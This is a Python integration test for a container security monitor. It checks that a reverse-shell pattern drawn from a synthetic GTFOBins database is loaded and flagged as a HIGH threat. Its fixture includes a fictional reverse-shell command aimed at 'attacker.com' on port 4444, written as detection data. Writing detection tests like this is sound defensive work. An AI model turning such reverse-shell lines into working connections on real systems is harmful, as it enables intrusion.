"""
Integration test: a GTFOBins DB-derived pattern is loaded and detected at runtime.

Sets up a synthetic GTFOBins clone, starts the security monitor with HOME pointing
at that clone, execs a process whose name matches the DB-only pattern
"frobnicator-reverse-shell", and asserts the daemon raises a HIGH threat event
referencing that pattern name.

If this test fails the end-to-end DB loading path in
internal/monitor/gtfobins.go is broken (the daemon is silently falling back to
compiled-in defaults only).
"""

import hashlib
import json
import os
import subprocess
import time

import pytest

# Minimal GTFOBins YAML for a fictional binary "frobnicator".
# The token "--frobsocket" is the only distinctive keyword: "attacker.com" is
# stripped as a placeholder and "4444" is stripped as a numeric port.
# Mirrors the synthetic fixture in TestLoadExecPatterns_ClonePresent
# (internal/monitor/procwatcher_test.go).
_FROBNICATOR_YAML = """\
---
functions:
  reverse-shell:
  - code: |-
      frobnicator --frobsocket attacker.com 4444
"""


def _container_name(workspace):
    abs_path = os.path.abspath(workspace)
    h = hashlib.sha256(abs_path.encode()).hexdigest()[:8]
    prefix = os.getenv("COI_CONTAINER_PREFIX", "coi-")
    return f"{prefix}{h}-1"


def _container_state(name):
    result = subprocess.run(
        ["incus", "list", name, "--format=json"],
        capture_output=True,
        text=True,
        timeout=10,
    )
    if result.returncode != 0:
        return "Unknown"
    containers = json.loads(result.stdout)
    return containers[0].get("status", "Unknown") if containers else "Unknown"


def _cleanup(name, coi_binary):
    subprocess.run([coi_binary, "container", "delete", name, "--force"], timeout=30, check=False)


def test_gtfobins_db_pattern_loaded_and_detected(tmp_path, coi_binary):
    """
    DB-derived pattern "frobnicator-reverse-shell" triggers a HIGH threat event.

    Flow:
    1. Write synthetic GTFOBins YAML to <tmp_home>/.coi/gtfobins/_gtfobins/frobnicator
    2. Write monitoring config to <tmp_home>/.coi/config.toml
    3. Start coi shell with HOME=<tmp_home> so the daemon reads from the fake clone
    4. Exec a process with argv[0]="frobnicator --frobsocket" in the container
       — arg0 prefix matches "frobnicator"; keyword "--frobsocket" appears in cmdline
    5. Poll <tmp_home>/.coi/audit/<container>.jsonl for a HIGH threat event whose
       description contains the DB-derived pattern name "frobnicator-reverse-shell"
    """
    fake_home = tmp_path / "home"
    coi_dir = fake_home / ".coi"
    gtfobins_dir = coi_dir / "gtfobins" / "_gtfobins"
    gtfobins_dir.mkdir(parents=True)
    (gtfobins_dir / "frobnicator").write_text(_FROBNICATOR_YAML)

    coi_dir.mkdir(parents=True, exist_ok=True)
    (coi_dir / "config.toml").write_text(
        """
[network]
mode = "open"

[monitoring]
enabled = true
auto_pause_on_high = false
auto_kill_on_critical = false
poll_interval_sec = 1
file_read_threshold_mb = 500
file_read_rate_mb_per_sec = 1000
process_count_threshold = 9999
process_spawn_rate_threshold = 9999
"""
    )

    workspace = tmp_path / "workspace"
    workspace.mkdir()
    (workspace / "README.md").write_text("# Test")

    env = {**os.environ, "HOME": str(fake_home)}
    proc = subprocess.Popen(
        [coi_binary, "shell", "--workspace", str(workspace), "--slot", "1"],
        stdin=subprocess.DEVNULL,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        env=env,
    )

    container_name = _container_name(str(workspace))
    ready = False
    for _ in range(30):
        if _container_state(container_name) == "Running":
            ready = True
            break
        time.sleep(1)

    if not ready:
        proc.terminate()
        try:
            proc.wait(timeout=15)
        except subprocess.TimeoutExpired:
            proc.kill()
        pytest.skip(f"Container {container_name} did not reach Running state")

    # PROC_EVENT_EXEC fires once at execve, so the proc-connector subscription
    # must be established before we exec — otherwise the event is missed.
    time.sleep(3)

    # argv[0] = "frobnicator --frobsocket" satisfies:
    #   - Arg0 prefix check  : "frobnicator --frobsocket".split()[0] → "frobnicator"
    #   - keyword check      : "--frobsocket" appears in full cmdline
    # sleep 5 (not 30) keeps the process alive long enough for the daemon to read
    # /proc after the exec event, without piling up long-lived sleeps as we re-fire.
    def fire():
        subprocess.Popen(
            [
                "incus",
                "exec",
                container_name,
                "--",
                "bash",
                "-c",
                "exec -a 'frobnicator --frobsocket' sleep 5",
            ],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

    fire()

    log_path = coi_dir / "audit" / f"{container_name}.jsonl"
    detected = False
    for i in range(40):
        time.sleep(1)
        # Re-fire periodically: the first exec can land before the proc-connector
        # subscription is active (daemon still starting under CI load) and be missed.
        # Each launch is a fresh execve, guaranteeing one fires after subscription.
        if i % 3 == 2:
            fire()
        if log_path.exists():
            for raw in log_path.read_text().splitlines():
                if not raw.strip():
                    continue
                try:
                    ev = json.loads(raw)
                except json.JSONDecodeError:
                    continue
                if "level" not in ev:
                    continue
                text = ev.get("description", "") + ev.get("title", "")
                if "frobnicator-reverse-shell" in text:
                    detected = True
                    break
        if detected:
            break

    proc.terminate()
    try:
        proc.wait(timeout=15)
    except subprocess.TimeoutExpired:
        proc.kill()
    _cleanup(container_name, coi_binary)

    assert detected, (
        "No threat event referencing 'frobnicator-reverse-shell' found in "
        f"{log_path} — the GTFOBins DB pattern was not loaded or not matched"
    )
